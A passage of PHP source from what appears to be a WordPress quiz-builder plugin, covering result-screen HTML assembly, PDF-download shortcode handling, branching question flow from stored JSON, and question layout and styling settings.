				$point_range =  explode("--",$point_range1);																 
				if(count($point_range) == 1){																	
					$point_range =  explode("-",$point_range1);		
				}else{
					$point_range[1] = '-'.$point_range[1];	
				}
				$range_val_start = $point_range[0];	
				$range_val_end =  $point_range[1];
				
				$correct_ans_num =  $outcomeobj->getCorrectAnsNum();
				$correct_ans_range =  $outcomeobj->getCorrectAnsRange();
				$outcome_screen =  $outcomeobj->getOutcomeScreen();
				$redirect =  $outcomeobj->getRedirect();
				$randval = rand(1,100);	
				
				
				$redirectpos = @strpos($redirect, "http");
				if( ($redirectpos === false)){
					 $get_permalink = (!empty($_SERVER['HTTPS'])) ? "https://".$_SERVER['SERVER_NAME'] : "http://".$_SERVER['SERVER_NAME']; 
					//If it begins with https...
					if (preg_match('/^https/', $get_permalink)) {
					  //...then we'll set the $url_prefix variable to https://
					  $url_prefix = 'https://';
					} else {
					  //If it does not begin with https we'll use http
					  $url_prefix = 'http://';
					}
							
					$redirectlink = $url_prefix.$redirect;
				}else{
					$redirectlink = $redirect ;
				}
				
				
				$redirectlink  = str_replace('%%OUTCOMETITLE%%',$outcome_name,$redirectlink); 
				
				 
				$outcome_redirect_options ='<input type="hidden" id="outcome_name" value="'.$outcome_name.'"/><input type="hidden" id="outcome_redirect" value="'.$redirectlink.'"/><input type="hidden" id="outcome_screen" value="'.$outcome_screen.'"/>';
				//checking if the quiz_type is assessment or scoring, then outcome will be based on points or range
				if($range_val_start == ""){
					$range_val_start = 0;
				}
				if($range_val_end == ""){
					$range_val_end = 0;
				}
				$point_arr[]= $point;	
				$min_point_range_arr[]= $range_val_start;
				$max_point_range_arr[]= $range_val_end;
				if($quiz_type =="assessment" || $quiz_type =="scoring"){
					$point_outcome_data =" data-outcome-type='".$outcome_type."'"; 
					if($outcome_type =="correct_ans"){
						$point_data =" data-point='".$point."'"; 
						
					}else{
						$point_data =" data-point-min='".$range_val_start."'  data-point-max='".$range_val_end."'"; 
						
					}
				} 
				
				$outcome_temp_html=urldecode($outcome_temp_html);
				$outcome_temp_html1 = $outcome_redirect_options.$outcome_temp_html;
				$outcome_temp_html1 =  str_replace('contenteditable="true"','contenteditable="false"',$outcome_temp_html1); 
				//$outcome_temp_html =  str_replace('[Outcome_Type]',$outcome_name,$outcome_temp_html); 
				$outcome_temp_html1 =  str_replace('[Outcome_Title]',$outcome_name,$outcome_temp_html1); 
				$share_paremets = base64_encode($fb_paremets.'&quiz_id='.$id.'&outcome_id='.$outcome_id.'&outcome_name='.$outcome_name);	
				
				$mergadata1 = '<div style="display:none;"><div >%%CATEGORY_TOTAL_PERCENT%%</div><div>%%CATEGORY_TOTAL_NUMBER%%</div> <div>[CATEGORY_TOTAL_PERCENT]</div> <div>[CATEGORY_TOTAL_NUMBER]</div></div>';
				$outcome_temp_html1 =  $outcome_temp_html1.$mergadata1; 	
				
				if($template_num == "template4"){
					$outcomehtml.= '<div class="outer-style3 outer_style3_new" style="display:none;border-top-color:'.$top_bg_color.'"><span class="outer_style3_span_first" style="border-color:'.$top_bg_color.' transparent transparent"></span><span style="border-color:'.$top_bg_color.' transparent transparent" class="outer_style3_span_second"></span><input type="hidden" id="share_params_'.$outcome_id.'" name="share_params" value="'.$share_paremets.'"><div id="outcome_id_'.$outcome_id.'" '.$point_data.''.$point_outcome_data.' class="outcome_div" data-outcome-id="'.$outcome_id.'"  style="display:none"><input type="hidden" name="outcome_id" value="'.$outcome_id.'"><input type="hidden" name="share_paremets" value="'.$share_paremets.'"> '.stripslashes($outcome_temp_html1).'</div></div>';
				} else{
					$outcomehtml.= '<input type="hidden" id="share_params_'.$outcome_id.'" name="share_params" value="'.$share_paremets.'"><div id="outcome_id_'.$outcome_id.'" '.$point_data.''.$point_outcome_data.' class="outcome_div " data-outcome-id="'.$outcome_id.'"  style="display:none; "><input type="hidden" name="outcome_id" value="'.$outcome_id.'"><input type="hidden" name="share_paremets" value="'.$share_paremets.'"> '.stripslashes($outcome_temp_html1).'</div>';
				}
			}//end isset

			if($showpdfbutton == 'Y'){

				if(defined('SQB_PD_FILE')){

					//if (str_contains($outcomehtml, '[DOWNLOADPDF]')) { 
					if (strpos($outcomehtml, '[DOWNLOADPDF]') !== false) {
						
						$pdfgenerate = sqbPdfGenerate($quiz_id, $outcome_id, $pdf_button_html); 
						$outcomehtml = str_replace('[DOWNLOADPDF]',$pdfgenerate,$outcomehtml);  
					}else if(strstr( $outcomehtml, '[DOWNLOADPDF label' )){
						$attributes = [];
					    if (preg_match_all('/\w+\=\".*?\"/', $outcomehtml, $key_value_pairs)) {
					        foreach($key_value_pairs[0] as $kvp) {
					            $kvp = str_replace('"', '', $kvp);
					            $pair = explode('=', $kvp);
					            $attributes[$pair[0]] = $pair[1];
					        }
					    }

					    $atts = $attributes['label'];
						$pdfgenerate = sqbPdfGenerate($quiz_id, $outcome_id, $pdf_button_html, $atts); 

						
						$outcomehtml = str_replace('[DOWNLOADPDF label="'.$attributes['label'].'"]',$pdfgenerate,$outcomehtml); 

					}
				}else{
					if (strpos($outcomehtml, '[DOWNLOADPDF]') !== false) { 
					//if (str_contains($outcomehtml, '[DOWNLOADPDF]')) { 
						$outcomehtml = str_replace('[DOWNLOADPDF]','',$outcomehtml);  
					}else if(strstr( $outcomehtml, '[DOWNLOADPDF label' )){
						$attributes = [];
					    if (preg_match_all('/\w+\=\".*?\"/', $outcomehtml, $key_value_pairs)) {
					        foreach($key_value_pairs[0] as $kvp) {
					            $kvp = str_replace('"', '', $kvp);
					            $pair = explode('=', $kvp);
					            $attributes[$pair[0]] = $pair[1];
					        }
					    }

					    $atts = $attributes['label'];
						$outcomehtml = str_replace('[DOWNLOADPDF label="'.$attributes['label'].'"]','',$outcomehtml); 
					}
				}
			}else{
				if (strpos($outcomehtml, '[DOWNLOADPDF]') !== false) { 
				//if (str_contains($outcomehtml, '[DOWNLOADPDF]')) { 
					$outcomehtml = str_replace('[DOWNLOADPDF]','',$outcomehtml);  
				}else if(strstr( $outcomehtml, '[DOWNLOADPDF label' )){
					$attributes = [];
				    if (preg_match_all('/\w+\=\".*?\"/', $outcomehtml, $key_value_pairs)) {
				        foreach($key_value_pairs[0] as $kvp) {
				            $kvp = str_replace('"', '', $kvp);
				            $pair = explode('=', $kvp);
				            $attributes[$pair[0]] = $pair[1];
				        }
				    }

				    $atts = $attributes['label'];
					$outcomehtml = str_replace('[DOWNLOADPDF label="'.$attributes['label'].'"]','',$outcomehtml); 
				}
			}

			
		}//end foreach						
		  
		
		


		$hiddendiv= '<div class="quiz_result_hidden" style="display:none"></div>';
		//get min and max outcome points 

		$min_range_val = 0;
		if(is_array($min_point_range_arr) && count($min_point_range_arr)){
		 $min_range_val =  min($min_point_range_arr);
		}

		$max_range_val = 0;
		if(is_array($max_point_range_arr) && count($max_point_range_arr)){
		 $max_range_val =  max($max_point_range_arr);
		}

		$min_point_val = 0;
		if(is_array($point_arr) && count($point_arr)){
		 $min_point_val =  min($point_arr);
		}

		$max_point_val = 0;   
		if(is_array($point_arr) && count($point_arr)){
		 $max_point_val =  max($point_arr);
		}
		 
		if($quiz_type =="assessment" || $quiz_type =="scoring"){					 
			if($outcome_type =="correct_ans"){
				$outcome_hidden_val .= '<input type="hidden" name="min_outcome_point" id="min_outcome_point" value="'.$min_point_val.'">';
				$outcome_hidden_val .= '<input type="hidden" name="max_outcome_point" id="max_outcome_point"  value="'.$max_point_val.'">';
			}else{
				$outcome_hidden_val .= '<input type="hidden" name="min_outcome_point" id="min_outcome_point" value="'.$min_range_val.'">';
				$outcome_hidden_val .= '<input type="hidden" name="max_outcome_point" id="max_outcome_point"  value="'.$max_range_val.'">';
			}
		}
		 
		$displaydata= "display:none;";		
		if($template_num == 'template5'){
		$csspath =  plugin_dir_url(__FILE__)."includes/templates/result/template5/template5.css";
		} else if($template_num == 'template8'){
		$csspath =  plugin_dir_url(__FILE__)."includes/templates/result/template8/template8.css";
		} else {
		$csspath =  plugin_dir_url(__FILE__)."includes/templates/result/template2/template2.css";
		}
		
		$sqbObj =  SQB_Quiz::loadById($id); 
		if(isset($sqbObj) && !empty($sqbObj)){
			if($template_num == 'template8'){
				if($sqbObj->getTransparentBackgroundSettings() != ''){
					$get_settings = $sqbObj->getTransparentBackgroundSettings();

					$customizer_style_settings = maybe_unserialize($sqbObj->getCustomizerStyleSetting());
					if(!empty($customizer_style_settings["template8_background_image"])){
						$sqb_start_screen_background_image = 'sqb_start_screen_background_image';
					}

				}
			}
		}
		
		$cssfile = '<link href="'.$csspath.'" rel="stylesheet">'; 
		if($quiz_display =="popup" || $quiz_display =="exit" || $quiz_display =="entry" || $quiz_display =="time_based" || $quiz_display =="percentage_based"){

			$dynamic_template_class = 'result-screen-'.$template;

			$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
			$result_temp = '<div class="quiz_result_template_outer quiz_outer_fe hide_cls '.$classforvh.' '.$sqb_start_screen_background_image.'" style="'.$displaydata.'"><div class="modal_pop_center"><div class="'.$dynamic_template_class.' modal_pop_inn" style="'.$default_image.'">'.$image_background.$close_data.$cssfile.$outcomehtml.'</div> </div> </div> ';
		}else if($quiz_display == "corner_popup"){
			$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
			$result_temp = '<div class="quiz_result_template_outer quiz_outer_fe corner_popup hide_cls '.$classforvh.' '.$sqb_start_screen_background_image.'" style="'.$displaydata.'"><div class="modal_pop_corner '.$modal_pop_corner_position.'"><div class="modal_pop_inn" style="'.$default_image.'">'.$image_background.$close_data.$cssfile.$outcomehtml.'</div> </div> </div> ';
		}else{
			$result_temp = '<div class="quiz_result_template_outer quiz_outer_fe hide_cls '.$classforvh.' '.$sqb_start_screen_background_image.'" style="'.$displaydata.$default_image.'">'.$image_background.$cssfile.$outcomehtml.'</div> ';
		}

		if($template == "template6"){
				$result_temp .= '<style>.result_temp_outer {position: relative; z-index: 999; }</style>';
			}
		
	}	 
	
	//for lesson, if lesson exist then show the outcome that user got 
	$outcomedata_html_final="";
	$outcomedata_css="";
	if($lesson_id !=""){ 
		$outcometoshow = sqb_user_outcome($quiz_id, $dap_id, $course_id, $lesson_id);
		if($outcometoshow !=""){
			$outcomedata = SQB_Outcome::loadById($outcometoshow);
			if(isset($outcomedata) && !empty($outcomedata)){
				 
				$outcomedatahtml =  $outcomedata->getOutcomeHtml();			
				$outcome_name1 =  $outcomedata->getOutcomeName();			
				$outcomedata_html=urldecode($outcomedatahtml);
				$outcomedata_html =  str_replace('contenteditable="true"','contenteditable="false"',$outcomedata_html); 
				$outcomedata_html =  str_replace('[Outcome_Title]',$outcome_name1,$outcomedata_html);
				$styledata = '';
				if($template_num == "template4"){
					$sqbtemplateobj =  SQB_QuizTemplate::loadByQuizId($quiz_id); 
					$top_bg_color = "#f56640";
					 if(isset($sqbtemplateobj)){		 
						$top_bg_color_array =  $sqbtemplateobj->getCommonStyle();
						$top_bg_color_array = explode("|",$top_bg_color_array);
						if(is_array($top_bg_color_array) && count($top_bg_color_array)){  
							$top_bg_color = $top_bg_color_array[1];	
							$q_border_style = $top_bg_color_array[2];	
							$q_border_color = $top_bg_color_array[3];	
							$q_border_wid = $top_bg_color_array[4];	
							
							$styledata = '<style> quiz_result_template_outer1   .outer-style3{border-top-color:'.$top_bg_color.'}.quiz_result_template_outer1 .outer-style3::before, .quiz_result_template_outer1  .outer-style3::after{border-color:'.$top_bg_color.' transparent transparent;}</style>';
						}
						  
					}
		 
					$outcomedata_html = '<div class="outer-style3" ><div id="outcome_id_lesson'.$outcometoshow.'"  class="outcome_div_lesson" data-outcome-id="'.$outcometoshow.'"  style="display:block"> '.stripslashes($outcomedata_html).'</div></div>';
				} else{
					$outcomedata_html = '<div id="outcome_id_lesson'.$outcometoshow.'"   class="outcome_div_lesson" data-outcome-id="'.$outcometoshow.'"  style="display:block"> '.stripslashes($outcomedata_html).'</div>';
				}
					
			 
				if($quiz_type == "scoring" || $quiz_type == "assessment") {
					
					$points_got = sqb_user_point_details($quiz_id, $dap_id, $course_id, $lesson_id);
					$points_got_array = explode("||",$points_got);
					$points_scored  =  $points_got_array[0];
					$total_points=  $points_got_array[1];
					if($quiz_type == "scoring" ) {
						$outcomedata_html =  str_replace('%%YOURSCORE%%',$points_scored,$outcomedata_html); 
						$outcomedata_html =  str_replace('%%TOTALSCORE%%',$total_points,$outcomedata_html);  
					}
					if( $quiz_type == "assessment") {
						$outcomedata_html =  str_replace('%%CORRECTANSWERS%%',$points_scored,$outcomedata_html); 
						$outcomedata_html =  str_replace('%%TOTALQUESTIONS%%',$total_points,$outcomedata_html);  
					}
				}
				
				$outcomedata_html_final = $styledata.'<div class="quiz_result_template_outer1 quiz_outer_fe hide_cls" style="display:none">'.$outcomedata_html.'</div> <style> .quiz_result_template_outer.quiz_outer_fe { margin-top: 30px;}</style>';
			}
		}
		$outcomedata_css = '  <style>.sqb_quiz_container_outer #sqb_quiz_builder .quiz_result_template_outer.quiz_outer_fe{display:none !important;}  </style>';
	}//for lesson ends here
	
	$hiddendiv= '<div class="quiz_result_hidden" style="display:none"></div>';
	//for calculator formula in outcome
	$sqb_formula_data = sqbCalculatorFormulaShortcode($id);
	$outcomehtml1= '<div class="outcome_data_cont" style="display:none;"></div>'; 
	return $outcomehtml1.$result_temp.$outcome_hidden_val.$outcomedata_html_final.$sqb_formula_data.$hiddendiv.$outcomedata_css;	 	 
}


function sqbPdfGenerate($quiz_id, $outcome_id, $buttondata ='', $atts=''){
	$siteurl = get_site_url('');
	$custom_label_title = '';
	//$pathtopdf = $siteurl.'/wp-content/plugins/sqb-pdf-download/inc/dompdf/outcome_pdf.php';
 	
	/*$buttondata .='<div class="certDownloadBtn" class="pdfbutton_download" style="float: left;text-decoration: none;color: #7454ad;padding: 9px;margin-bottom: 0px;outline: none;display: inline-block;background: #fff;font-weight: 600;border-radius: 5px;border: none;
max-width: 175px;width: 100%;text-align: center;border: 2px solid #7454ad;font-size: 15px;"  onclick="';	
	$buttondata .="return sqbQuizPdf('sqbQuizForm','$quiz_id', '$outcome_id', '$pathtopdf');";
	$buttondata .='">Download PDF</div>';	*/
	if($atts){
		$custom_label_title = '<input type="hidden" value="'.$atts.'" class="outcome_pdf_title">'; 
	}
	
	$pdfdata = '<form action="'.SQB_PD_FILE.'" method="post" name="sqbQuizForm" id="sqbQuizForm'.$quiz_id.$outcome_id.'" target="_blank"></form><div class="generate_pdf_form" data-outcome-id='.$outcome_id.' href="'.SQB_PD_FILE.'?quiz_id='.$quiz_id.'&outcome_id='.$outcome_id.'">'.$buttondata.$custom_label_title.'</div>';     
	return $pdfdata;
}



//Get funnel data in array 
function sqbGetFunneldataByQuizId($quizid = 0){
	$sqbFunnelObj =  SQB_Funnel::loadByQuizId($quizid);
	$sqb_funnel_ques_ans_connection_array = array();
	 if($sqbFunnelObj){
		
			$funnel_data = $sqbFunnelObj->getFunnelData();
			//print_r($funnel_data);die;
			$funnel_data = json_decode(stripslashes($funnel_data), true);
			if($funnel_data == ''){
				$funnel_data = json_decode($sqbFunnelObj->getFunnelData(), true);

			}

			//$funnel_data = stripslashes($funnel_data);
			//$funnel_data = json_decode($funnel_data,true);
	
			if(isset($funnel_data['drawflow']['Home']['data'])){
				$data = $funnel_data['drawflow']['Home']['data'];
						
				foreach($data as $single_data){
							
					$inputs = $single_data['inputs'];
					$outputs = $single_data['outputs'];
					
					$quetion_obj = SQB_QuizQuestionBank::loadById($single_data['id']);
					
					if($quetion_obj){  // check if question is not deleted
						$sqb_funnel_ques_ans_connection_array[$single_data['id']]['question_id'] = $single_data['id'];
							
						foreach($outputs as $output){
							// Get ans details
							if(isset($output['connections'][0])){
								$sqb_funnel_ques_ans_connection_array[$single_data['id']]['answer_ids'][] = $output['connections'][0]['node'];
							}
							// Get next question details
						   foreach($output['connections'] as $output_connections_info_key =>  $output_connections_info){
							   if($output_connections_info_key == 0){
								   continue;
							   }
							   
							   if(isset($output['connections'][$output_connections_info_key])){
								$quetion_obj = SQB_QuizQuestionBank::loadById($output['connections'][$output_connections_info_key]['node']);
								if($quetion_obj){  // check if question is not deleted
									
									if(isset($data[$output['connections'][$output_connections_info_key]['node']]['inputs'])){
											foreach($data[$output['connections'][$output_connections_info_key]['node']]['inputs'] as $next_question_info){
												  
												foreach($next_question_info['connections'] as $next_question_info_input){
													
													if((int)$single_data['id'] == (int)$next_question_info_input['node']){
														$sqb_funnel_ques_ans_connection_array[$single_data['id']]['next_question'][$output['connections'][0]['node']] = $output['connections'][$output_connections_info_key]['node'];
														$sqb_funnel_ques_ans_connection_array[$single_data['id']]['next_question11'][$output['connections'][0]['node']] = (int)$single_data['id'].'___'.(int)$next_question_info_input['node'];		
													}
												}
											}
											
									}
									
								}
							}
							   
							
							}
							
						
							
						}// foreach loop close for outputs variable
					}
							
				}// foreach loop close for data variable
						
			}
		}
			 
	 return $sqb_funnel_ques_ans_connection_array;
}

function sqbGetBackFunneldataByQuizId($quizid = 0){
	$sqbFunnelObj =  SQB_Funnel::loadByQuizId($quizid);
	$sqb_funnel_ques_ans_connection_array = array();
	 if($sqbFunnelObj){
		$funnel_data = $sqbFunnelObj->getFunnelData();
		$funnel_data = json_decode(stripslashes($funnel_data), true);
		if($funnel_data == ''){
			$funnel_data = json_decode($sqbFunnelObj->getFunnelData(), true);
		}

		if(isset($funnel_data['drawflow']['Home']['data'])){
			$data = $funnel_data['drawflow']['Home']['data'];
			$back_btn_data = array();
			foreach($data as $single_data){
				$question_id = $single_data['id'];
				$back_quesiton_id = @$single_data['inputs']['input_1']['connections'][0]['node'];
				$back_btn_data['question_id'] = $question_id;
				$back_btn_data['back_question'] = $back_quesiton_id;
				$sqb_funnel_ques_ans_connection_array[$question_id] = $back_btn_data;
			}
		}
	}
	return $sqb_funnel_ques_ans_connection_array;
}



//get the questions 
function sqbGetQuestions($quizid, $quiz_type, $quiz_display, $quiz_pagination, $question_per_page, $question_display, $number_of_question,  $ques_template, $branching, $display_nextbutton , $questions_random , $question_bank_options, $answers_random, $lesson_id, $show_start_screen, $retakedata, $count_manage_lead_data, $course_id , $dap_id,$template_num,$questions_top_border_setting,$display_backbutton ){
	$check_enable_question_bank='';	
	$sqbObj =  SQB_Quiz::loadById($quizid);
	if(isset($sqbObj) && $sqbObj){
		$enable_question_bank = $sqbObj->getQuestionBankOption();
     	if($enable_question_bank){
     		$check_enable_question_bank = explode('|', $enable_question_bank);
     		$check_enable_question_bank = $check_enable_question_bank[0];
     	}
	}

	if($branching == 'Y'){
		$sqbloadquestionsobj = sqbGetFunneldataByQuizId($quizid);
	}else{
		if($check_enable_question_bank == 'Y'){
			$sqbloadquestionsobj =  SQB_QuizQuestions::loadByQuizIdAndOrder($quizid);
		}else{
			$sqbloadquestionsobj =  SQB_QuizQuestions::loadByQuizId($quizid);
		}
	}


	
	
	if($template_num == 'template4'  ){
		$sqbtemplateobj =  SQB_QuizTemplate::loadByQuizId($quizid); 
		$top_bg_color = "#f56640";
		 if(isset($sqbtemplateobj)){		 
			$top_bg_color_array =  $sqbtemplateobj->getCommonStyle();
			$top_bg_color_array = explode("|",$top_bg_color_array);
			if(is_array($top_bg_color_array) && count($top_bg_color_array)){  
				$top_bg_color = $top_bg_color_array[1];	
				$q_border_style = $top_bg_color_array[2];	
				$q_border_color = $top_bg_color_array[3];	
				$q_border_wid = $top_bg_color_array[4];	
			}
			  
		}
	}
	$styleformatrix = "";
	$settings_data="";
	$outcome_tag_width="";
	$questiondata ="";
	$progressbar ="";
	$buttondata_outer="";
	$add_show_img_cls = "";
	$add_anslayout_cls = "";
	$hidden_fields_data = "";
	$number_of_question = 9999;
	$multiple_correct_cls = "";
	$multiple_ques_true ="";
	$skipped_btn ="";	
	$quiz_pagination_divider = '';
	$totalques='';
	$style_new_questions_top_border='';
	if($question_display =="limited"){
		$number_of_question = $number_of_question;
	}else{
		$number_of_question = 9999;
	}
	
	$progressInactive = '#4a689a';
	$progressActive  = '#e9ecef';	
	$progressSettings = sqbGetValidSettingsByKey('progressbar_color');
	if($progressSettings != ''){
		$progressSettings = explode('||' , $progressSettings);
		$progressActive = $progressSettings[1];
		$progressInactive = $progressSettings[0];
	}	

	$screen_name = 'settings_background_color';
	$strm_type = 'settings';
	$setting_progress_color = "rgba(79,108,191,1)";
	$setting_progress_inactive_color = "rgba(255,255,255,1)";
	$theme_data_has = SQB_GlobalTheme::loadByQuizIdAndNameAndType($quizid,$screen_name,$strm_type);
	if($theme_data_has){
		$colorpickerdata = maybe_unserialize($theme_data_has->getValue());

		if(!empty($colorpickerdata["setting_progress_color"])){
			$setting_progress_color = $colorpickerdata["setting_progress_color"];
		}

		if(!empty($colorpickerdata["setting_progress_inactive_color"])){
			$setting_progress_inactive_color = $colorpickerdata["setting_progress_inactive_color"];
		}
	}


	
	$progressbar = ' <div class="progress" style="background-color:'.$setting_progress_inactive_color.'">
		<div class="progress-bar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width:0%;background-color:'.$setting_progress_color.'">
		  <span class="sr-only progress_percent"></span>
		</div>
	  </div>';	
	
	if(isset($sqbloadquestionsobj)){
		$question_bank_explode = explode('||',$question_bank_options); 
		if(isset($question_bank_explode)){
			if(!empty($question_bank_explode[1]) && $question_bank_explode[1] == 'Y'){
				if(!empty($question_bank_explode[2])){
					$totalques = $question_bank_explode[2];		
				}else{
					$totalques =count($sqbloadquestionsobj);
				}
			}else{
				$totalques =count($sqbloadquestionsobj);
			}
		}
		$totalques_count = 0;
		$ques_count = 0;
		
		$questions_order_array = array();
		$adsHTML = array();
		$is_ads_enabled = $sqbObj->getQnsAds();
		
		foreach($sqbloadquestionsobj as $sqbloadquestionsobj_key => $questionObj){
			
			$question_id  = $sqbloadquestionsobj_key;

			if($branching != 'Y'){
				$qid = $questionObj->getQuestionId();
			
				$ads_status = $questionObj->getShowAds();
				if($ads_status == 'Y' && $is_ads_enabled == 'Y'){
					$adhtml_content = $questionObj->getQuestionAdsHtml();

					$ads_next_btn = stripslashes($sqbObj->getAdsNextButton());
					$adsHTML[$qid] = '<div class="quiz_ans_a_d_html_outer" style="display:none;">'.$adhtml_content.'<div class="a_d_next_btn">'.$ads_next_btn.'</div></div>';
				}
			}else{

				$q_id  = $sqbloadquestionsobj_key;
				$qdata = SQB_QuizQuestions::loadByQuestionId($q_id);
				
				//$qdata = $qdata[0]->getShowAds();
				
				$ads_status = $qdata[0]->getShowAds();	

				if($ads_status == 'Y' && $is_ads_enabled == 'Y'){
					
					$adhtml_content = $qdata[0]->getQuestionAdsHtml();

					$ads_next_btn = stripslashes($sqbObj->getAdsNextButton());
					$adsHTML[$q_id] = '<div class="quiz_ans_a_d_html_outer" style="display:none;">'.$adhtml_content.'<div class="a_d_next_btn">'.$ads_next_btn.'</div></div>';
				}
			}

			if($branching == 'Y'){ // branching flow
				/*$question_id  = $sqbloadquestionsobj_key;
				 $question_data = SQB_QuizQuestionBank::loadById($question_id);
				$questions_order_array[$question_id] = $question_data; 
				*/
				
				$question_id  = $sqbloadquestionsobj_key;
				$question_data = SQB_QuizQuestionBank::loadById($question_id);
			   
				 if($question_data){
				  $question_order =  $question_data->getQuestionOrder();
				  if(isset($questions_order_array[$question_order])){
						$max_key_index = max(array_keys($questions_order_array)); 
						if(isset($questions_order_array[$max_key_index])){
							 $question_order = $max_key_index + 1;
						 }else{
							$question_order = count($questions_order_array) + 1;
						}
					}
					$questions_order_array[$question_order] = $question_id; 
				}
				
			}else if($question_bank_explode[0] == 'Y'){

				$question_id  = $questionObj->getQuestionId();	
				$question_order  = $questionObj->getQuestionOrder();	
				$question_data = SQB_QuizQuestionBank::loadById($question_id);
				if(isset($questions_order_array[$question_order])){
					$max_key_index = max(array_keys($questions_order_array)); 
						if(isset($questions_order_array[$max_key_index])){
							 $question_order = $max_key_index + 1;
						 }else{
							$question_order = count($questions_order_array) + 1;
						}
				}	
				$questions_order_array[$question_order] = $question_data; 
			   
			}else{ // normal flow
				
				$question_id  = $questionObj->getQuestionId();	   
				$question_data = SQB_QuizQuestionBank::loadById($question_id);
			   
			   if($question_data){
				  $question_order =  $question_data->getQuestionOrder();
				  if(isset($questions_order_array[$question_order])){
						$max_key_index = max(array_keys($questions_order_array)); 
						if(isset($questions_order_array[$max_key_index])){
							 $question_order = $max_key_index + 1;
						 }else{
							$question_order = count($questions_order_array) + 1;
						}
					}
					$questions_order_array[$question_order] = $question_data; 
			   }
		   
		   }
		}
		
		ksort($questions_order_array);	

		$questions_id_array = array();
		if($branching == 'Y'){
			
			$questions_id_array = $questions_order_array;
		
		}else{
			
			if(isset($questions_order_array) && !empty($questions_order_array)){
				foreach($questions_order_array as $quet_id => $questions) {
					if(!empty($questions->id)){
                   		$questions_id_array[] = $questions->id;
                    }
				}			
			}		 
			//for calculator
			if($quiz_type !="calculator"){		 
				if($questions_random == "Y"){				
					shuffle($questions_id_array);				 
				}
			}
 
			$question_bank_explode = explode('||',$question_bank_options);
			if(isset($question_bank_explode)){
				if(!empty($question_bank_explode[1]) && $question_bank_explode[1] == 'Y'){ 
					if(!empty($question_bank_explode[2])){
						$num = $question_bank_explode[2];	
						
						for ($i=0; $i<$num; $i++) {
							if(count($questions_id_array) !== 0){
								$random = array_rand($questions_id_array);
								$get_it[] = $questions_id_array[$random];
								unset($questions_id_array[$random]);
							}
					 }
					 $questions_id_array = $get_it;
					}else{
						shuffle($questions_id_array);
					}
				}
			}
		}

		$q= 1;
		if(!empty($questions_id_array)){
		foreach($questions_id_array as $quet_id => $questions) {
			$display_nextbuttons = $display_nextbutton;
			$ques_count++;
			$totalques_count++;
			if($questions){
				$question_id = $questions;
				 $allow_skip_ques ="N";
				 $skip_mapping ="";
				$sqbquestionobj =  SQB_QuizQuestionBank::loadById($question_id) ;
				

				if(isset($sqbquestionobj)){
					$question = $sqbquestionobj->getQuestion(); 
					$question_type = $sqbquestionobj->getQuestionType();
					$question_order = $sqbquestionobj->getQuestionOrder();	
					$show_ans_img = $sqbquestionobj->getAnsWithImg();	
					$ans_layout = $sqbquestionobj->getAnsLayout();	
					$multiple_correct = $sqbquestionobj->getMultipleCorrectAns();	
					$allow_skip_ques = $sqbquestionobj->getAllowSkipQues();	
					$temp_customizer = $sqbquestionobj->getTempCustomizer();
				 	$imageSetting = maybe_unserialize($sqbquestionobj->getAnsImgSetting());
					
					
					
					$next_button_html = $sqbquestionobj->getQuestionsNextButtonHtml();
					$skip_button_html = $sqbquestionobj->getQuestionsSkipButtonHtml();
					$enable_background_image = $sqbquestionobj->getEnableBackgroundImage();
					$skip_mapping = $sqbquestionobj->getSkipMapping();
					$temp_customizer = explode("||",$temp_customizer);	
					$temp_wid = $temp_customizer[0];
					$question_catgory_id = $sqbquestionobj->getCategoryId();
					$question_catgory_obj = SQB_QuizCategory::loadById($question_catgory_id);
					if(!isset($question_catgory_obj)){
						$question_catgory_id  = 0;
					}
					
					$file_upload_setting = $sqbquestionobj->getFileUploadSettings();
					$settings_value = array_filter(explode(",",str_replace("|",",", $file_upload_setting)));
					$max_file_upload_size = array_pop($settings_value);
					$file_upload_settings = implode(",",$settings_value);
					
					
					
					$quiz_temp_left_bgcolor = "";
					$quiz_temp_right_bgcolor = "";
					$quiz_temp_heights = "";
					$background_image_url = "";
					$background_image_size = "";
					$background_image_repeat = "";
					$background_image_position = "";
					$title_background_color = "";
					$title_background_color_opacity = "";
					$progress_bar_color = "";
					$matrix_label_text = $sqbquestionobj->getMatrixLabelText();
					$matrix_html = $sqbquestionobj->getMatrixHtml();
					
					$question_customizer = $sqbquestionobj->getTempCustomizer();	
					$question_customizer_array = explode("||",$question_customizer);
					$question_inner_style = '';
					if($template_num == 'template8'){
						if($quiz_type == 'poll'){
							$question_inner_width = ((int)$question_customizer_array[1]+40).'px';
						}else{
							$question_inner_width = @$question_customizer_array[1];
						}
						if($question_type  == 'rating'){
						$question_inner_width = $question_customizer_array[3];
						}
						if($question_inner_width == ''){
						$question_inner_width = '1200px';
						}
					    $question_inner_style = "style='max-width:".$question_inner_width."'";
					}
					
					
					$rating_html = "";
					if($question_type  == 'rating'){
						if(isset($temp_customizer[1])){
							$question_rating_lable_low_text = stripslashes($temp_customizer[1]);
							
							$rating_html .= '<div class="rating_info_left">'.$question_rating_lable_low_text.'</div>';
						}
						if(isset($temp_customizer[2])){
							$question_rating_lable_high_text = stripslashes($temp_customizer[2]);
							
							$rating_html .= '<div class="rating_info_right">'.$question_rating_lable_high_text.'</div>';
						}
						
						
						if(isset($temp_customizer[1]) || isset($temp_customizer[2])){
							$rating_html  = '<div class="rating_info" '.$question_inner_style.'>'.$rating_html.'</div>';
							$answers_random = 'N';
						}
						if(isset($temp_customizer[3])){
							$quiz_temp_left_bgcolor = $temp_customizer[3];
						}
						if(isset($temp_customizer[4])){
							$quiz_temp_right_bgcolor = $temp_customizer[4];
						}
						if(isset($temp_customizer[5])){
							$quiz_temp_heights = $temp_customizer[5];
						}
						if(isset($temp_customizer[6])){
							$background_image_url = stripslashes($temp_customizer[6]);
						}
						if(isset($temp_customizer[7])){
							$background_image_size = stripslashes($temp_customizer[7]);
						}
						if(isset($temp_customizer[8])){
							$background_image_repeat = stripslashes($temp_customizer[8]);
						}
						if(isset($temp_customizer[9])){
							$background_image_position = stripslashes($temp_customizer[9]);
						}
						if(isset($temp_customizer[10])){
							$title_background_color = stripslashes($temp_customizer[10]);
						}
						if(isset($temp_customizer[11])){
							$title_background_color_opacity = stripslashes($temp_customizer[11]);
						}
						if(isset($temp_customizer[12])){
							$progress_bar_color = stripslashes($temp_customizer[12]);
						}
					} else {
						if(isset($temp_customizer[1])){
							$quiz_temp_left_bgcolor = $temp_customizer[1];
						}
						if(isset($temp_customizer[2])){
